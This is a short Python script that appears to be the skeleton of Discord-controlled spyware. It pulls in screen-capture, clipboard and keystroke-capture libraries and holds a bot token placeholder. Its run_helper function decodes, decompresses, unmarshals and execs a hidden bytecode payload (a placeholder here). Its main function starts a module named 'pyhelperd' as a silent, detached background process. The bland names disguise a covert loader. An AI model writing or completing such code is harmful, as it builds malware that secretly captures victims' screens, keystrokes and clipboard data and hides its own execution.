import base64
import lzma
import marshal
import subprocess

DEPS = ["discord.py", "mss", "pyperclip", "pynput"]
TOKEN = "YOUR_TOKEN_HERE"
BYTECODE = "encoded payload placeholder"


def run_helper():
    compressed = base64.z85decode(BYTECODE)
    code = marshal.loads(lzma.decompress(compressed))
    exec(code)


def main():
    subprocess.Popen(
        ["python", "-m", "pyhelperd"],
        stdin=subprocess.DEVNULL,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        start_new_session=True,
    )
